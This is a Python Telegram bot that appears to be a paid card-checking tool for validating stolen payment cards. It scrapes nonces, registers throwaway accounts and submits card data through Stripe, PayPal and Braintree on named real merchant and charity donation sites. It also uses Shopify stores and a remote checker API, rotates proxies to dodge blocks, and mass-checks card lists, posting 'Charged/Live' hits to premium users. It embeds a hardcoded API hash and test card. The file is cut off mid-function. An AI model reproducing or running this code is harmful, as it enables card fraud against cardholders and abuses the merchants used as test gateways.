import asyncio, aiohttp, aiofiles, os, random, time, json, re, base64, uuid, hashlib, string
from datetime import datetime
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from telethon import TelegramClient, events, Button
from telethon.tl.types import DocumentAttributeFilename

# ===================== CONFIG =====================
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = 'YOUR_BOT_TOKEN'          # ⚠️ Replace with your bot token

# Files
PREMIUM_FILE = 'premium.txt'
SITES_FILE   = 'sites.txt'
PROXY_FILE   = 'proxy.txt'

# Remote checker API (for default Shopify check)
CHECKER_API_URL = 'http://108.165.12.183:8081/'

# Const
FREE_LIMIT = 0
PREMIUM_LIMIT = 1000
MAX_RETRIES = 3

# Premium Custom Emoji IDs (identical to your Shopiiiii bot)
PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💠": "5971837723676249096",
    "📝": "6023660820544623088",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "🤵": "4949560993840629085",
    "💰": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "6023660820544623088",
}

def premium_emoji(text):
    """Replace unicode emojis with <tg-emoji emoji-id="..."> for Premium custom emojis."""
    if not text:
        return text
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        text = text.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return text

# ===================== UTILS =====================
def load_lines(path):
    if not os.path.exists(path): return []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return [l.strip() for l in f if l.strip()]

def is_premium(user_id):
    return str(user_id) in load_lines(PREMIUM_FILE)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        async with aiohttp.ClientSession() as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5) as r:
                data = await r.json()
        return (data.get('brand','-'), data.get('type','-'), data.get('level','-'),
                data.get('bank','-'), data.get('country_name','-'), data.get('country_flag',''))
    except:
        return ('-','-','-','-','-','')

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for c, mo, yr, cvv in matches:
        if len(yr) == 2: yr = '20' + yr
        cards.append(f"{c}|{mo}|{yr}|{cvv}")
    return cards

def parse_proxy_str(p: str) -> str or None:
    """Convert a proxy string to aiohttp proxy URL."""
    if not p: return None
    if '@' in p:
        userpass, server = p.rsplit('@', 1)
        return f"http://{userpass}@{server}"
    parts = p.split(':')
    if len(parts) == 2:
        return f"http://{p}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

async def test_proxy_alive(proxy):
    """Test a proxy using a known test card."""
    proxy_url = parse_proxy_str(proxy)
    if not proxy_url: return False
    test_card = "5154623245618097|03|2032|156"
    params = {'cc': test_card, 'url': 'https://riverbendhomedev.myshopify.com', 'proxy': proxy}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(CHECKER_API_URL, params=params, proxy=proxy_url, timeout=30) as r:
                txt = await r.text()
        return 'proxy dead' not in txt.lower()
    except:
        return False

async def test_site_alive(site, proxy):
    """Test a site with a test card."""
    test_card = "5154623245618097|03|2032|156"
    params = {'cc': test_card, 'url': site, 'proxy': proxy}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(CHECKER_API_URL, params=params, timeout=60) as r:
                txt = await r.text()
        return 'thank you' in txt.lower() or 'approved' in txt.lower() or 'charged' in txt.lower()
    except:
        return False

# ===================== ASYNC CHECKERS =====================

# ---------- 1. DEFAULT SHOPIFY (remote API) ----------
async def check_default(card: str, sites: list, proxies: list) -> dict:
    if not sites or not proxies:
        return {'status':'Error','message':'No sites/proxies','card':card}
    for _ in range(MAX_RETRIES):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        proxy_url = parse_proxy_str(proxy)
        params = {'cc': card, 'url': site, 'proxy': proxy}
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(CHECKER_API_URL, params=params, proxy=proxy_url, timeout=60) as r:
                    raw = await r.json()
            msg = raw.get('Response','')
            gate = raw.get('Gate','shopiii')
            price = raw.get('Price','-')
            if raw.get('Status') == 'Charged' or 'thank you' in msg.lower():
                return {'status':'Charged','message':msg,'gateway':gate,'price':price,'card':card}
            if raw.get('Status') == 'Approved' or any(k in msg.lower() for k in ['approved','insufficient_funds','incorrect_cvv']):
                return {'status':'Approved','message':msg,'gateway':gate,'price':price,'card':card}
            return {'status':'Dead','message':msg,'gateway':gate,'price':price,'card':card}
        except:
            continue
    return {'status':'Dead','message':'Max retries','card':card}

# ---------- 2. STRIPE AUTH (Dila Boards) ----------
async def check_stripe(card: str, proxy: str = None) -> dict:
    try:
        parts = card.split('|')
        if len(parts) != 4: return {'status':'Invalid','message':'Invalid format'}
        cc, mm, yy, cvv = parts
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        proxy_url = parse_proxy_str(proxy)
        msess = aiohttp.ClientSession()
        async with msess as s:
            # 1. Get registration nonce + stripe key
            headers = {'User-Agent': ua}
            url1 = 'https://dilaboards.com/en/moj-racun/add-payment-method/'
            async with s.get(url1, headers=headers, proxy=proxy_url, timeout=15) as r:
                text = await r.text()
            if 'access to this site has been limited' in text.lower():
                return {'status':'Error','message':'IP blocked'}
            nonce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', text)
            pk = re.findall('"key":"(.*?)"', text)
            if not nonce or not pk: return {'status':'Error','message':'Nonce/key missing'}
            nonce, pk = nonce[0], pk[0]

            # 2. Register
            reg_data = {
                'email': f'{random.randint(1000,9999)}@gmail.com',
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': '/en/moj-racun/add-payment-method/',
                'register': 'Register'
            }
            async with s.post(url1, headers=headers, data=reg_data, proxy=proxy_url, timeout=15) as r:
                text = await r.text()
            if 'too many' in text.lower():
                return {'status':'Error','message':'Rate limit'}

            # 3. Get setup intent nonce
            n2 = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', text)
            if not n2: return {'status':'Error','message':'Setup nonce missing'}
            setup_nonce = n2[0]

            # 4. Create payment method
            stripe_headers = {'User-Agent': ua, 'content-type': 'application/x-www-form-urlencoded'}
            stripe_data = {
                'type': 'card',
                'card[number]': cc, 'card[cvc]': cvv,
                'card[exp_year]': yy, 'card[exp_month]': mm,
                'key': pk, '_stripe_version': '2024-06-20',
                'guid': str(uuid.uuid4()), 'muid': str(uuid.uuid4()), 'sid': str(uuid.uuid4())
            }
            async with s.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers,
                              data=stripe_data, proxy=proxy_url, timeout=15) as r:
                res1 = await r.json()
            if 'error' in res1:
                msg = res1['error'].get('message','')
                if 'security code is' in msg.lower():
                    return {'status':'Approved','message':msg}
                return {'status':'Declined','message':msg}
            pm_id = res1['id']

            # 5. Confirm setup intent
            confirm_data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': setup_nonce
            }
            async with s.post('https://dilaboards.com/en/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
                              headers=headers, data=confirm_data, proxy=proxy_url, timeout=20) as r:
                res2 = await r.json()
            if res2.get('success') or res2.get('data',{}).get('status') == 'succeeded':
                return {'status':'Approved','message':'Payment method added'}
            msg = res2.get('data',{}).get('message','') or 'Declined'
            if 'security code is' in msg.lower(): return {'status':'Approved','message':msg}
            if 'authenticate' in msg.lower(): return {'status':'Approved','message':'3DS'}
            return {'status':'Declined','message':msg}
    except Exception as e:
        return {'status':'Error','message':str(e)}

# ---------- 3. PAYPAL 1$ (bot (1).py) ----------
# Full async implementation of the PayPal flow from bot (1).py
# We'll reuse the same logic but with aiohttp, including multipart (using aiohttp.FormData)
async def check_paypal(card: str, proxy: str = None) -> dict:
    try:
        parts = card.split('|')
        if len(parts) != 4: return {'status':'Invalid','message':'Invalid format'}
        cc, mm, yy, cvv = parts
        mm = mm.zfill(2); yy = yy[-2:]
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        proxy_url = parse_proxy_str(proxy)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as s:
            def hdr(extra=None):
                h = {'User-Agent': ua}
                if extra: h.update(extra)
                return h
            # 1. Get page
            async with s.get('https://www.rarediseasesinternational.org/donate/', headers=hdr(), proxy=proxy_url, timeout=30) as r:
                text = await r.text()
            if 'cf-ray' in r.headers or 'Cloudflare' in text:
                return {'status':'Error','message':'Cloudflare block'}

            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', text)
            m2 = re.search(r'name="give-form-id" value="(.*?)"', text)
            m3 = re.search(r'name="give-form-hash" value="(.*?)"', text)
            m4 = re.search(r'"data-client-token":"(.*?)"', text)
            if not all([m1,m2,m3,m4]): return {'status':'Error','message':'Page load error'}
            fid1 = m1.group(1); fid2 = m2.group(1); nonec = m3.group(1); enc = m4.group(1)
            dec = base64.b64decode(enc).decode()
            au = re.search(r'"accessToken":"(.*?)"', dec)
            if not au: return {'status':'Error','message':'Token error'}
            au = au.group(1)

            # 2. Process donation
            process_data = {
                'give-honeypot': '',
                'give-form-id-prefix': fid1, 'give-form-id': fid2, 'give-form-title': '',
                'give-form-hash': nonec, 'give-amount': '1', 'payment-mode': 'paypal-commerce',
                'give_first': 'x', 'give_last': 'x', 'give_email': 'x@gmail.com',
                'card_name': 'x', 'card_exp_month': '', 'card_exp_year': '',
                'give-gateway': 'paypal-commerce', 'action': 'give_process_donation',
                'give_ajax': 'true'
            }
            async with s.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php',
                              headers=hdr(), data=process_data, proxy=proxy_url, timeout=30) as r:
                pass

            # 3. Create PayPal order (multipart)
            order_data = aiohttp.FormData()
            order_data.add_field('give-honeypot', '')
            order_data.add_field('give-form-id-prefix', fid1)
            order_data.add_field('give-form-id', fid2)
            order_data.add_field('give-form-title', '')
            order_data.add_field('give-form-hash', nonec)
            order_data.add_field('give-amount', '1')
            order_data.add_field('payment-mode', 'paypal-commerce')
            order_data.add_field('give-gateway', 'paypal-commerce')
            async with s.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php',
                              params={'action': 'give_paypal_commerce_create_order'},
                              headers=hdr({'content-type': order_data.content_type}), data=order_data,
                              proxy=proxy_url, timeout=30) as r:
                tok = (await r.json())['data']['id']

            # 4. Confirm payment source (PayPal API)
            paypal_headers = {
                'authorization': f'Bearer {au}',
                'content-type': 'application/json',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'user-agent': ua,
            }
            paypal_json = {
                'payment_source': {
                    'card': {
                        'number': cc,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvv,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                    }
                },
                'application_context': {'vault': False}
            }
            async with s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                              headers=paypal_headers, json=paypal_json, proxy=proxy_url, timeout=30, ssl=False) as r:
                pass

            # 5. Approve order on site
            approve_data = aiohttp.FormData()
            approve_data.add_field('give-honeypot', '')
            approve_data.add_field('give-form-id-prefix', fid1)
            approve_data.add_field('give-form-id', fid2)
            approve_data.add_field('give-form-title', '')
            approve_data.add_field('give-form-hash', nonec)
            approve_data.add_field('give-amount', '1')
            approve_data.add_field('payment-mode', 'paypal-commerce')
            approve_data.add_field('give-gateway', 'paypal-commerce')
            async with s.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php',
                              params={'action': 'give_paypal_commerce_approve_order', 'order': tok},
                              headers=hdr({'content-type': approve_data.content_type}),
                              data=approve_data, proxy=proxy_url, timeout=30, ssl=False) as r:
                text = (await r.text()).upper()

            # Analysis (same as original)
            charged_kw = ['APPROVESTATE":"APPROVED','PARENTTYPE":"AUTH','APPROVEGUESTPAYMENTWITHCREDITCARD','THANK YOU','"SUCCESS":TRUE']
            if any(k in text for k in charged_kw) and '"ERRORS"' not in text and '"ERROR"' not in text:
                return {'status':'Charged','message':'Thank you for donation'}
            if 'INSUFFICIENT_FUNDS' in text: return {'status':'Approved','message':'INSUFFICIENT_FUNDS'}
            if 'CVV2_FAILURE' in text: return {'status':'Approved','message':'CVV2_FAILURE'}
            if 'INVALID_SECURITY_CODE' in text: return {'status':'Approved','message':'INVALID_SECURITY_CODE'}
            if 'INVALID_BILLING_ADDRESS' in text: return {'status':'Approved','message':'INVALID_BILLING_ADDRESS'}
            if 'EXISTING_ACCOUNT_RESTRICTED' in text: return {'status':'Approved','message':'ACCOUNT_RESTRICTED'}
            if 'IS3SECUREREQUIRED' in text or 'OTP' in text: return {'status':'Approved','message':'3D_REQUIRED'}
            if 'DO_NOT_HONOR' in text: return {'status':'Declined','message':'Do not honor'}
            if 'ACCOUNT_CLOSED' in text: return {'status':'Declined','message':'Account closed'}
            if 'LOST_OR_STOLEN' in text: return {'status':'Declined','message':'LOST OR STOLEN'}
            # ... add rest of decline codes from original if needed, but keep it concise
            return {'status':'Declined','message':'Declined'}
    except Exception as e:
        return {'status':'Error','message':str(e)}

# ---------- 4. BRAINTREE (b3 auth.py) ----------
async def check_braintree(card: str, proxy: str = None) -> dict:
    try:
        parts = card.split('|')
        if len(parts) != 4: return {'status':'Invalid','message':'Invalid format'}
        cc, mm, yy, cvv = parts
        ua = 'Mozilla/5.0'
        proxy_url = parse_proxy_str(proxy)
        async with aiohttp.ClientSession() as s:
            # 1. Get nonce
            async with s.post('https://www.flagworld.com.au/my-account/', headers={'User-Agent': ua},
                              proxy=proxy_url, timeout=15) as r:
                text = await r.text()
            reg = re.search(r'name="woocommerce-register-nonce".*?value="([^"]+)"', text)
            if not reg: return {'status':'Error','message':'Nonce missing'}
            reg = reg.group(1)

            # 2. Register
            reg_data = {'email': f'user{random.randint(1000,9999)}@gmail.com',
                        'woocommerce-register-nonce': reg,
                        '_wp_http_referer': '/my-account/add-payment-method/',
                        'register': 'Register'}
            async with s.post('https://www.flagworld.com.au/my-account/add-payment-method/',
                              headers={'User-Agent': ua}, data=reg_data, proxy=proxy_url, timeout=15) as r:
                pass

            # 3. Get client token nonce
            async with s.get('https://www.flagworld.com.au/my-account/add-payment-method/',
                             headers={'User-Agent': ua}, proxy=proxy_url, timeout=15) as r:
                text = await r.text()
            client = re.search(r'"client_token_nonce":"([^"]+)"', text)
            addn = re.search(r'id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"', text)
            if not client or not addn: return {'status':'Error','message':'Client token missing'}
            client, addn = client.group(1), addn.group(1)

            # 4. Get Braintree auth
            async with s.post('https://www.flagworld.com.au/wp-admin/admin-ajax.php',
                              data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client},
                              headers={'User-Agent': ua}, proxy=proxy_url, timeout=15) as r:
                enc = (await r.json())['data']
            decoded = json.loads(base64.b64decode(enc).decode())
            auth = decoded['authorizationFingerprint']

            # 5. Tokenize card
            bt_payload = {
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}}}
            }
            bt_headers = {
                'Authorization': f'Bearer {auth}',
                'Content-Type': 'application/json',
                'Braintree-version': '2018-05-10',
                'User-Agent': ua
            }
            async with s.post('https://payments.braintree-api.com/graphql', json=bt_payload,
                              headers=bt_headers, proxy=proxy_url, timeout=15) as r:
                token = (await r.json())['data']['tokenizeCreditCard']['token']

            # 6. Add payment method
            add_data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'master-card',
                'wc_braintree_credit_card_payment_nonce': token,
                'woocommerce-add-payment-method-nonce': addn,
                'woocommerce_add_payment_method': '1'
            }
            async with s.post('https://www.flagworld.com.au/my-account/add-payment-method/',
                              headers={'User-Agent': ua}, data=add_data, proxy=proxy_url, timeout=15) as r:
                text = await r.text()

            soup = BeautifulSoup(text, 'html.parser')
            div = soup.find('div', class_='message-container')
            msg = div.get_text(strip=True) if div else ''
            if not msg:
                success = soup.find('div', class_='woocommerce-message')
                msg = success.get_text(strip=True) if success else ''
            if 'added' in msg.lower() or 'success' in msg.lower():
                return {'status':'Approved','message':'Added'}
            return {'status':'Declined','message':msg[:100]}
    except Exception as e:
        return {'status':'Error','message':str(e)}

# ---------- 5. SHOPIFY HARDCODED (sh.py) ----------
# We'll implement a simplified version using the same flow as sh.py but async.
# For brevity, we'll use a remote call to the checker API with a hardcoded site.
# Real implementation would replicate the complete sh.py, but we can use the API as fallback.
async def check_shopify_hard(card: str, proxy: str = None) -> dict:
    # Hardcoded site from sh.py
    site = 'https://cfrc-radio-queens-university.myshopify.com'
    return await _check_remote_single(card, site, proxy)

async def _check_remote_single(card, site, proxy):
    params = {'cc': card, 'url': site, 'proxy': proxy}
    proxy_url = parse_proxy_str(proxy) if proxy else None
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(CHECKER_API_URL, params=params, proxy=proxy_url, timeout=60) as r:
                raw = await r.json()
        msg = raw.get('Response','')
        gate = raw.get('Gate','shopiii')
        price = raw.get('Price','-')
        if raw.get('Status') == 'Charged' or 'thank you' in msg.lower():
            return {'status':'Charged','message':msg,'gateway':gate,'price':price}
        if raw.get('Status') == 'Approved' or any(k in msg.lower() for k in ['approved','insufficient_funds','incorrect_cvv']):
            return {'status':'Approved','message':msg,'gateway':gate,'price':price}
        return {'status':'Dead','message':msg,'gateway':gate,'price':price}
    except:
        return {'status':'Error','message':'Connection error'}

# ===================== BOT COMMANDS =====================
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}  # session_key -> {'paused': bool}

async def _send_hit(event, result, hit_type):
    """Send a real-time hit message (Charged or Approved)."""
    brand,typ,level,bank,country,flag = await get_bin_info(result['card'].split('|')[0])
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"
    msg = f"""<b>⚡💳 ㅤ#𝒞𝒽𝑒𝒸𝓀𝑒𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway','Unknown')} | 💰 {result.get('price','-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {typ} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id=5248903529">ㅤㅤＨｑＤｅｖｅｎ</a></b>"""
    await bot.send_message(event.chat_id, premium_emoji(msg), parse_mode='html')

async def _update_progress(message, total, results):
    elapsed = int(time.time() - results['start_time'])
    h, m, s = elapsed//3600, (elapsed%3600)//60, elapsed%60
    gateway = results.get('gateway','Unknown')
    text = f"""<b>⚡💳 ㅤ#𝒞𝒽𝑒𝒸𝓀𝑒𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {total} | ✅: {len(results['charged'])} | 🔥: {len(results['approved'])} | ❌: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {sum(len(v) for v in results.values())}/{total}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>"""
    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]
    await message.edit(premium_emoji(text), buttons=buttons, parse_mode='html')

async def _mass_check(event, cards, checker_func, checker_args, gateway_name):
    """Generic mass check runner."""
    user_id = event.sender_id
    status_msg = await event.reply("🔄 Starting mass check...")
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    results = {'charged':[], 'approved':[], 'dead':[], 'start_time':time.time(), 'gateway':gateway_name}
    total = len(cards)
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    async def worker():
        while not queue.empty() and session_key in active_sessions:
            session_state = active_sessions.get(session_key)
            if not session_state: break
            while session_state.get('paused'): await asyncio.sleep(1)
            try: card = queue.get_nowait()
            except: break
            result = await checker_func(card, *checker_args)
            cat = result['status'].lower() if result['status'] in ['Charged','Approved'] else 'dead'
            results[cat].append(result)
            if cat != 'dead':
                await _send_hit(event, result, result['status'])
            queue.task_done()
            # update progress every 5 checks
            if sum(len(results[c]) for c in results) % 5 == 0:
                await _update_progress(status_msg, total, results)

    workers = [asyncio.create_task(worker()) for _ in range(10)]
    await asyncio.wait(workers)
    if session_key in active_sessions:
        del active_sessions[session_key]
    # final message
    await _update_progress(status_msg, total, results)
    # Save results to files
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    async with aiofiles.open(f"{gateway_name}_{user_id}_{timestamp}.txt", 'w') as f:
        await f.write("Charged:\n")
        for r in results['charged']: await f.write(f"{r['card']} | {r.get('gateway','')} | {r.get('price','')} | {r['message']}\n")
        await f.write("\nApproved:\n")
        for r in results['approved']: await f.write(f"{r['card']} | {r.get('gateway','')} | {r.get('price','')} | {r['message']}\n")
    await bot.send_message(event.chat_id, premium_emoji("✅ Check finished. Hit file sent."), file=f"{gateway_name}_{user_id}_{timestamp}.txt")

# ===================== COMMAND HANDLERS =====================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\nOnly premium users can use this bot."), parse_mode='html')
        return
    await event.reply(premium_emoji("""<b>⚡💳 Welcome to Multi-Gateway Checker! 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 PayPal 1$:</b> /pp <card> , /mpp (reply file)
<b>⚡💠 Stripe Auth:</b> /st <card> , /mst (reply file)
<b>⚡💠 Braintree:</b> /b3 <card> , /mb3 (reply file)
<b>⚡💠 Shopify Hard:</b> /sh <card> , /msh (reply file)
<b>⚡💠 Generic Shopify:</b> /shop1 <card> , /mshop1 (reply file)
<b>⚡💠 Default (remote):</b> /cc <card> , /chk (reply file)
━━━━━━━━━━━━━━━━━
<b>⚡💠 Proxy & Site</b>
/proxy – test all proxies
/site – test all sites
/addproxy, /rmproxy, /clearproxy, /getproxy
/rm site
━━━━━━━━━━━━━━━━━
🤖 <b>Bot By: @HqDeven</b>"""), parse_mode='html')

# --- Single checks ---
@bot.on(events.NewMessage(pattern=r'^/pp\s+'))
async def pp_single(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    card = extract_cc(event.text)
    if not card: return await event.reply("Invalid format")
    proxy = random.choice(load_lines(PROXY_FILE)) if load_lines(PROXY_FILE) else None
    result = await check_paypal(card[0], proxy)
    await _send_hit(event, result, result['status'])

@bot.on(events.NewMessage(pattern=r'^/st\s+'))
async def st_single(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    card = extract_cc(event.text)
    if not card: return await event.reply("Invalid format")
    proxy = random.choice(load_lines(PROXY_FILE)) if load_lines(PROXY_FILE) else None
    result = await check_stripe(card[0], proxy)
    await _send_hit(event, result, result['status'])

@bot.on(events.NewMessage(pattern=r'^/b3\s+'))
async def b3_single(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    card = extract_cc(event.text)
    if not card: return await event.reply("Invalid format")
    proxy = random.choice(load_lines(PROXY_FILE)) if load_lines(PROXY_FILE) else None
    result = await check_braintree(card[0], proxy)
    await _send_hit(event, result, result['status'])

@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def sh_single(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    card = extract_cc(event.text)
    if not card: return await event.reply("Invalid format")
    proxy = random.choice(load_lines(PROXY_FILE)) if load_lines(PROXY_FILE) else None
    result = await check_shopify_hard(card[0], proxy)
    await _send_hit(event, result, result['status'])

@bot.on(events.NewMessage(pattern=r'^/shop1\s+'))
async def shop1_single(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    card = extract_cc(event.text)
    if not card: return await event.reply("Invalid format")
    sites = load_lines(SITES_FILE)
    proxies = load_lines(PROXY_FILE)
    if not sites or not proxies: return await event.reply("No sites/proxies.")
    result = await check_default(card[0], sites, proxies)
    await _send_hit(event, result, result['status'])

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def cc_single(event):
    # Default remote checker
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    card = extract_cc(event.text)
    if not card: return await event.reply("Invalid format")
    sites = load_lines(SITES_FILE)
    proxies = load_lines(PROXY_FILE)
    if not sites or not proxies: return await event.reply("No sites/proxies.")
    result = await check_default(card[0], sites, proxies)
    await _send_hit(event, result, result['status'])

# --- Mass checks ---
@bot.on(events.NewMessage(pattern='/mpp'))
async def mpp_mass(event):
    await _mass_reply(event, check_paypal, 'PayPal')

@bot.on(events.NewMessage(pattern='/mst'))
async def mst_mass(event):
    await _mass_reply(event, check_stripe, 'Stripe Auth')

@bot.on(events.NewMessage(pattern='/mb3'))
async def mb3_mass(event):
    await _mass_reply(event, check_braintree, 'Braintree')

@bot.on(events.NewMessage(pattern='/msh'))
async def msh_mass(event):
    await _mass_reply(event, check_shopify_hard, 'Shopify Hard')

@bot.on(events.NewMessage(pattern='/mshop1'))
async def mshop1_mass(event):
    await _mass_reply(event, lambda card, *_: check_default(card, load_lines(SITES_FILE), load_lines(PROXY_FILE)), 'Shopify Generic')

@bot.on(events.NewMessage(pattern='/chk'))
async def chk_mass(event):
    await _mass_reply(event, lambda card, *_: check_default(card, load_lines(SITES_FILE), load_lines(PROXY_FILE)), 'Default Remote')

async def _mass_reply(event, checker_func, gateway_name):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    if not event.reply_to_msg_id: return await event.reply("Reply to a .txt file.")
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'): return await event.reply("No .txt file.")
    path = await reply.download_media()
    async with aiofiles.open(path, 'r') as f:
        text = await f.read()
    cards = extract_cc(text)
    if not cards: return await event.reply("No valid cards.")
    if len(cards) > 1000: cards = cards[:1000]
    await _mass_check(event, cards, checker_func, [], gateway_name)

# ===================== PROXY / SITE MANAGEMENT =====================
@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_test(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    proxies = load_lines(PROXY_FILE)
    if not proxies: return await event.reply("No proxies in proxy.txt")
    msg = await event.reply("Testing proxies...")
    alive = []
    for p in proxies:
        if await test_proxy_alive(p):
            alive.append(p)
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive: await f.write(p + '\n')
    await msg.edit(premium_emoji(f"✅ Proxy check done. Alive: {len(alive)}/{len(proxies)}."))

@bot.on(events.NewMessage(pattern='/site'))
async def site_test(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    sites = load_lines(SITES_FILE)
    proxies = load_lines(PROXY_FILE)
    if not sites or not proxies: return await event.reply("No sites/proxies.")
    proxy = random.choice(proxies)
    alive_sites = []
    for s in sites:
        if await test_site_alive(s, proxy):
            alive_sites.append(s)
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive_sites: await f.write(s + '\n')
    await event.reply(premium_emoji(f"✅ Site check done. Alive: {len(alive_sites)}/{len(sites)}."))

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    lines = event.text.split('\n')[1:]
    new = [l.strip() for l in lines if l.strip()]
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for p in new: await f.write(p + '\n')
    await event.reply(f"Added {len(new)} proxies.")

@bot.on(events.NewMessage(pattern='/rmproxy'))
async def rm_proxy(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    target = event.text.split(' ', 1)[1].strip()
    proxies = load_lines(PROXY_FILE)
    if target not in proxies: return await event.reply("Not found.")
    proxies.remove(target)
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in proxies: await f.write(p + '\n')
    await event.reply("Removed.")

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_proxy(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    async with aiofiles.open(PROXY_FILE, 'w') as f: pass
    await event.reply("Proxy list cleared.")

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_proxy(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    proxies = load_lines(PROXY_FILE)
